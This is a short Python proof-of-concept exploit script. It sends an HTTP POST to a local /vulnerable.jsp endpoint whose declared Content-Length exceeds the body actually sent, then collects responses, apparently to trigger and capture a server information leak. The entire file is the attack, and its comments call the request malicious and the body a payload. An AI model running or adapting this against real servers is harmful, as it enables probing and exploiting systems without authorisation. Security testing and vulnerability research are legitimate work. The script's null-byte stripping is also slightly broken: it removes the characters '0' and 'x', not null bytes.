import socket

# Sever address and port
server_address = ("127.0.0.1", 8080)


def main():
    # Create a TCP/IP socket
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

    try:
        # Connect to the server
        s.connect(server_address)

        # Construct malicious request, actual POST BODY content snet is less than 100 bytes 
        request_headers = (
            "POST /vulnerable.jsp HTTP/1.1\r\n"
            "Host: localhost\r\n"
            "Connection: keep-alive\r\n"
            "Content-Type: application/x-www-form-urlencoded\r\n"
            "Content-Length: 100\r\n"
            "\r\n"
        )
        incomplete_body = "incomplete_data=0"
        print("[*] Sending payload and waiting for timeout...")
        # sending malicious request
        s.sendall(request_headers.encode("utf-8"))
        s.sendall(incomplete_body.encode("utf-8"))
        # receive response
        response = []
        for i in range(5):
            data = s.recv(2048)
            response.append(data)
        # Combine response data and remove 0x00 at the end
        data = b"".join(response).decode("utf-8").rstrip("0x00")
        print(f"[!] Received (if) vulnerable response:\n{data}")

    except Exception as e:
        print(f"An error occurred: {e}")

    finally:
        # Ensure the socket is closed
        s.close()


if __name__ == "__main__":
    main()
